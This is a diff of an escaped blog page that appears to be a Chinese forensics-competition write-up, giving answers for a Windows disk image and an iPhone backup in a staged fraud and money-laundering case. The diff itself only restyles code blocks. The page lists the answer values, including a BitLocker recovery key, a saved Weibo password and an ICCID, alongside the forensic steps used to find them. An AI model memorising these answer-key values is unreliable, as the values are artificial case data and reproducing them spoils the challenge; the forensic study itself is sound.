@@ -49,13 +49,13 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;80518BC0DBF3315F806E9EDF7EE13C12
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2检材一-bitlocker-的恢复密钥是多少&#34;&gt;2.检材一 BitLocker 的恢复密钥是多少
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80518BC0DBF3315F806E9EDF7EE13C12
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2检材一-bitlocker-的恢复密钥是多少&#34;&gt;2.检材一 BitLocker 的恢复密钥是多少
 &lt;/h2&gt;&lt;p&gt;使用EFDD，配合检材三给出的的内存镜像爆破：&lt;/p&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709131041349.png&#34; alt=&#34;image-20250709131041349&#34; style=&#34;zoom:67%;&#34; /&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709131000961.png&#34; alt=&#34;image-20250709131000961&#34; style=&#34;zoom:67%;&#34; /&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;585805-292292-462539-352495-691284-509212-527219-095942
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3检材一镜像中用户最近一次打开的文件名是什么&#34;&gt;3.检材一镜像中用户最近一次打开的文件名是什么
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;585805-292292-462539-352495-691284-509212-527219-095942
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3检材一镜像中用户最近一次打开的文件名是什么&#34;&gt;3.检材一镜像中用户最近一次打开的文件名是什么
 &lt;/h2&gt;&lt;p&gt;依次点击：分析 -&amp;gt; 经典视图 -&amp;gt; 查看最后访问时间&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709134325642.png&#34;
 	
@@ -68,8 +68,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;最后一个文件名称为：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;列表.xlsx
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4检材一硬盘系统分区的起始位置&#34;&gt;4.检材一硬盘系统分区的起始位置
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;列表.xlsx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4检材一硬盘系统分区的起始位置&#34;&gt;4.检材一硬盘系统分区的起始位置
 &lt;/h2&gt;&lt;p&gt;查看系统分区：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709134940238.png&#34;
 	
@@ -82,8 +82,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;分区4是引导加载程序位置，之后的分区六应该才是主系统分区（硬盘分区），起始位置为：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;649216
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5检材一系统的版本号是多少格式xxxx&#34;&gt;5.检材一系统的版本号是多少(格式:x.x.x.x)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;649216
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5检材一系统的版本号是多少格式xxxx&#34;&gt;5.检材一系统的版本号是多少(格式:x.x.x.x)
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 系统信息：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709140134139.png&#34;
 	
@@ -97,10 +97,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;这里有两个版本号，组合在一起才是题目要求的格式&lt;/p&gt;
 &lt;p&gt;在win10和win11中，第二位数字（次要版本号）固定为0：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.0.19042.508
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;6检材一回收站中的文件被删除前的路径&#34;&gt;6.检材一回收站中的文件被删除前的路径
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.0.19042.508
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6检材一回收站中的文件被删除前的路径&#34;&gt;6.检材一回收站中的文件被删除前的路径
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 回收站记录：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250709141748631.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709141748631.png&#34;
 	
 	
 	
@@ -110,8 +110,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:/Users/rd/Desktop/iTunes(12.13.0.9).exe
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;7检材一给出最后一次修改系统时间前的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;7.检材一给出最后一次修改系统时间前的时间(格式: YYYY-MM-DD HH:MM:SS)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:/Users/rd/Desktop/iTunes(12.13.0.9).exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7检材一给出最后一次修改系统时间前的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;7.检材一给出最后一次修改系统时间前的时间(格式: YYYY-MM-DD HH:MM:SS)
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 系统时间变更 -&amp;gt; 时间变更记录：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142136256.png&#34;
 	
@@ -124,8 +124,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;比对各个更改时间的记录的操作时间，找出最晚操作的时间的原系统时间：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2023-12-12 16:37:12
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;8检材一最后一次远程连接本机的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;8.检材一最后一次远程连接本机的时间(格式: YYYY-MM-DD HH:MM:SS）
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-12 16:37:12
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8检材一最后一次远程连接本机的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;8.检材一最后一次远程连接本机的时间(格式: YYYY-MM-DD HH:MM:SS）
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 远程桌面 -&amp;gt; 远程连接过本机的记录：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142426055.png&#34;
 	
@@ -138,8 +138,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;查看连接成功记录，比对最晚的连接时间：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2023-12-11 15:57:02
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;9检材一-chrome-浏览器最后一次搜索过的关键词是什么&#34;&gt;9.检材一 Chrome 浏览器最后一次搜索过的关键词是什么
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-11 15:57:02
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9检材一-chrome-浏览器最后一次搜索过的关键词是什么&#34;&gt;9.检材一 Chrome 浏览器最后一次搜索过的关键词是什么
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Chrome浏览器 -&amp;gt; 历史记录 -&amp;gt; 最后访问时间 ：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142606570.png&#34;
 	
@@ -152,8 +152,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;从url里面看出搜索内容：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;常见的诈骗话术2023
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;10检材一是否连接过-u-盘如有请给出-u-盘的-sn-码&#34;&gt;10.检材一是否连接过 U 盘,如有,请给出 U 盘的 SN 码
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;常见的诈骗话术2023
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;10检材一是否连接过-u-盘如有请给出-u-盘的-sn-码&#34;&gt;10.检材一是否连接过 U 盘,如有,请给出 U 盘的 SN 码
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; USB最近使用记录 -&amp;gt; 操作时间：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142917357.png&#34;
 	
@@ -166,8 +166,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;查看接入过的最后一个设备：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FC2005927F271
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;11检材一-edge-浏览器最早一次下载过的文件文件名是&#34;&gt;11.检材一 Edge 浏览器最早一次下载过的文件文件名是
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FC2005927F271
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;11检材一-edge-浏览器最早一次下载过的文件文件名是&#34;&gt;11.检材一 Edge 浏览器最早一次下载过的文件文件名是
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Edge浏览器 -&amp;gt; 下载记录 -&amp;gt; 结束时间倒序：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709143212778.png&#34;
 	
@@ -180,8 +180,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;第一个i4tools8不知道为什么没有时间，但详细条目显示时间晚于winrar：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; winrar-x64-624scp.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;12嫌疑人访问的微博的密码的-md5-值&#34;&gt;12.嫌疑人访问的微博的密码的 MD5 值
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; winrar-x64-624scp.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12嫌疑人访问的微博的密码的-md5-值&#34;&gt;12.嫌疑人访问的微博的密码的 MD5 值
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Chrome浏览器 -&amp;gt; 保存的密码：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709143425660.png&#34;
 	
@@ -194,8 +194,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;微博密码是&lt;code&gt;!dfrDj*&amp;amp;j98_jUe8&lt;/code&gt;，计算MD5值：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;5cb42860b3b61ef6dd361ad556f48e05
-&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;检材二iphone-备份数据&#34;&gt;检材二(iPhone 备份数据)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5cb42860b3b61ef6dd361ad556f48e05
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材二iphone-备份数据&#34;&gt;检材二(iPhone 备份数据)
 &lt;/h1&gt;&lt;h2 id=&#34;13检材二备份的设备名称是什么&#34;&gt;13.检材二备份的设备名称是什么
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 设备信息：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709162101944.png&#34;
@@ -208,14 +208,14 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;User&amp;#34;的iPhone
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;14检材二手机的-ios-系统版本是多少&#34;&gt;14.检材二手机的 iOS 系统版本是多少
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;User&amp;#34;的iPhone
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;14检材二手机的-ios-系统版本是多少&#34;&gt;14.检材二手机的 iOS 系统版本是多少
 &lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;17.0
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;15检材二备份的时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;15.检材二备份的时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;17.0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;15检材二备份的时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;15.检材二备份的时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
 &lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2023-12-09 15:02:28
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;16嫌疑人-iphone-手机给号码13502409024最后一次打电话的时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;16嫌疑人 iPhone 手机给号码&amp;quot;13502409024&amp;quot;最后一次打电话的时间是(格式: YYYY-MM-DD HH:MM:SS)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-09 15:02:28
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;16嫌疑人-iphone-手机给号码13502409024最后一次打电话的时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;16嫌疑人 iPhone 手机给号码&amp;quot;13502409024&amp;quot;最后一次打电话的时间是(格式: YYYY-MM-DD HH:MM:SS)
 &lt;/h2&gt;&lt;p&gt;当前的备份文件中没有通话记录，其实这个藏在检材一中&lt;/p&gt;
 &lt;p&gt;分析 -&amp;gt; 嵌套证据识别 -&amp;gt; IOS备份：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709171132291.png&#34;
@@ -286,11 +286,11 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; 2023-12-04 13:18:50
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;17检材二使用过的号码-iccid-是多少&#34;&gt;17.检材二使用过的号码 ICCID 是多少
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2023-12-04 13:18:50
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;17检材二使用过的号码-iccid-是多少&#34;&gt;17.检材二使用过的号码 ICCID 是多少
 &lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;89860000191997734908
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;18检材二手机中高德地图最后搜索的地址&#34;&gt;18.检材二手机中高德地图最后搜索的地址
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;89860000191997734908
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;18检材二手机中高德地图最后搜索的地址&#34;&gt;18.检材二手机中高德地图最后搜索的地址
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 高德地图 -&amp;gt; 搜索点：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709170611265.png&#34;
 	
@@ -302,8 +302,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; 双山大道3号
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;19检材二手机最后一次登陆注册hotscoin的时间是格式-yyyy-mm-ddhhmmss&#34;&gt;19.检材二手机最后一次登陆/注册&amp;quot;HotsCoin&amp;quot;的时间是(格式: YYYY-MM-DDHH:MM:SS)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 双山大道3号
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;19检材二手机最后一次登陆注册hotscoin的时间是格式-yyyy-mm-ddhhmmss&#34;&gt;19.检材二手机最后一次登陆/注册&amp;quot;HotsCoin&amp;quot;的时间是(格式: YYYY-MM-DDHH:MM:SS)
 &lt;/h2&gt;&lt;p&gt;HotsCoin是数字交易平台，从短信中能得到登录时间&lt;/p&gt;
 &lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 短信：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172344826.png&#34;
@@ -316,8 +316,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2023-12-04 13:28:14
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;20检材二手机中照片img_0002的拍摄时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;20.检材二手机中照片&amp;quot;IMG_0002&amp;quot;的拍摄时间是(格式: YYYY-MM-DD HH:MM:SS)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-04 13:28:14
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;20检材二手机中照片img_0002的拍摄时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;20.检材二手机中照片&amp;quot;IMG_0002&amp;quot;的拍摄时间是(格式: YYYY-MM-DD HH:MM:SS)
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 图片 -&amp;gt; IMG_0002：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172828523.png&#34;
 	
@@ -329,8 +329,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2023-12-06 11:08:30
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;21检材二中小西米语音-app-的bundle-id是什么&#34;&gt;21.检材二中&amp;quot;小西米语音&amp;quot; app 的Bundle ID是什么
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-06 11:08:30
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;21检材二中小西米语音-app-的bundle-id是什么&#34;&gt;21.检材二中&amp;quot;小西米语音&amp;quot; app 的Bundle ID是什么
 &lt;/h2&gt;&lt;p&gt;Bundle ID是iOS应用唯一标识符，也就是包名&lt;/p&gt;
 &lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 应用列表 -&amp;gt; 搜索小西米语音：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173624166.png&#34;
@@ -343,8 +343,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;com.titashow.tangliao
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;22检材二中浏览器最后一次搜索的关键词是什么&#34;&gt;22.检材二中浏览器最后一次搜索的关键词是什么
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;com.titashow.tangliao
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;22检材二中浏览器最后一次搜索的关键词是什么&#34;&gt;22.检材二中浏览器最后一次搜索的关键词是什么
 &lt;/h2&gt;&lt;p&gt;浏览器不是uc浏览器，指的是safari&lt;/p&gt;
 &lt;p&gt;分析 -&amp;gt; Safari -&amp;gt; 搜索历史：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173822647.png&#34;
@@ -357,8 +357,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ios备份密码忘了怎么办 五位纯数字
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里也就是在提示前面的加密备份文件的密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ios备份密码忘了怎么办 五位纯数字
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里也就是在提示前面的加密备份文件的密码&lt;/p&gt;
 &lt;h2 id=&#34;23嫌疑人和洗钱人员约定电子钱包的品牌是什么-如有多个用顿号分隔&#34;&gt;23.嫌疑人和洗钱人员约定电子钱包的品牌是什么, 如有多个用顿号分隔
 &lt;/h2&gt;&lt;p&gt;微信聊天记录和信息里都没有相关信息，其他应用里面只有小西米语音有可能了&lt;/p&gt;
 &lt;p&gt;分析 -&amp;gt; 其他应用 -&amp;gt; 小西米语音 -&amp;gt; 在线连麦平台 -&amp;gt; 文件分类 -&amp;gt; SQLite 文件&lt;/p&gt;
@@ -378,15 +378,15 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;imToken、Bitcoin
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;24嫌疑人和洗钱人员约定电子钱包的金额比例是什么&#34;&gt;24.嫌疑人和洗钱人员约定电子钱包的金额比例是什么
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;imToken、Bitcoin
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;24嫌疑人和洗钱人员约定电子钱包的金额比例是什么&#34;&gt;24.嫌疑人和洗钱人员约定电子钱包的金额比例是什么
 &lt;/h2&gt;&lt;p&gt;同上题图：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0.2
